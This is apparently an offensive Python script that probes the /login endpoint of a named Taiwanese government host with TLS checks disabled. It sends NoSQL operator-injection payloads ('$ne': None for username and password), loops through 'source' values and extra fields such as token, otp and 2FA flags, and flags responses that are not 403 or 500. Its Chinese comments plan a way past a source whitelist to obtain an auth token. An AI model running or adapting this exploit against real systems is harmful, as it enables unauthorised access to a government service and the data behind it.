import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(body_dict):
    body=json.dumps(body_dict).encode()
    req=urllib.request.Request(BASE+"/login",data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 403 来自"匹配用户的 source 不在白名单"。
# 假设: 后端逻辑 = 匹配用户后, 检查 user.source in ALLOWED_SOURCES
# 若我能让注入查询匹配到 source 在白名单里的用户, 就能拿到 token
# 尝试: username 用 $ne 匹配所有, password 正常 —— 但 source 是用户字段, 请求无法控制
# 换思路: 测试 /login 是否接受 "source" 请求字段
print("=== /login 尝试 source 请求字段 ===")
for src in ["WEB","PORTAL","AUTH_SERVER","API","MOBILE","TPF","CONSOLE","ADMIN","PORT","EMERGENCY"]:
    code,b=post_login({"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER","source":src})
    mark=" ***" if code not in (403,500) else ""
    print(f"  source=[{src:12s}] -> {code} | {b[:60]}{mark}")
    time.sleep(0.08)

# 尝试: 请求体额外字段是否被读取
print("=== /login 额外字段探测 ===")
extras=[{"token":""},{"refreshToken":""},{"use2FA":True},{"otp":""},{"tfa":"123456"},{"source":"PORTAL"}]
for ex in extras:
    d={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    d.update(ex)
    code,b=post_login(d)
    print(f"  +{ex} -> {code} | {b[:60]}")
    time.sleep(0.08)
print("DONE")
